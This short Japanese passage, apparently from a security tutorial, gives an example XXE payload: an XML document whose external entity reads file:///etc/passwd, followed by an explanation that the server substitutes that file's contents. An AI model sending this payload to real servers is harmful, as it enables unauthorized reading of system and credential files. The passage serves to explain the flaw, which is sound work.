攻撃XMLの例
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<userInput>
  <name>&xxe;</name>
</userInput>
```
上記のXMLでは &xxe; の部分がサーバー上の /etc/passwd（Linuxのユーザー情報ファイル）の内容に置き換えられて処理されてしまいます。
